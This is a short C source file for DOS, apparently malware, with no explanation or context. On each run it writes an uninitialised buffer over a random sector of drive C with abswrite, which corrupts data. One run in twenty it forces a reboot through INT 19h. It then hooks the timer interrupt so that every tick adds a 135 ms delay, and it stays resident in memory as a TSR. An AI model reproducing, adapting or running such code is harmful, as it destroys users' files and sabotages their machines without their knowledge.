#include <process.h>
#include <stdlib.h>
#include <stdio.h>
#include <conio.h>
#include <dir.h>
#include <dos.h>

#define INTR 0X1C

#ifdef __cplusplus
    #define __CPPARGS ...
#else
    #define __CPPARGS
#endif

void interrupt ( *oldhandler)(__CPPARGS);

void interrupt handler(__CPPARGS)
{
delay(135);
oldhandler();
}

void main(void)
{
randomize();char buf[512];
abswrite(2, 1, random(50000)+2000, buf);

if(random(20) == 10)	asm	INT	19h

	oldhandler = getvect(INTR);
	setvect(INTR, handler);
	_ES = _psp; //PSP address
	asm	MOV     es,es:[2ch]
	_AH = 0x49; //Function 49 (remove memory block)
	asm	INT	21h        //Call DOS to execute instruction
	_AH = 0x31; //Function 31 (tsr)
	_AL = 0x00; //Exit code
	_DX = _psp; //PSP address
	asm	INT	21h        //Call DOS to execute instruction

}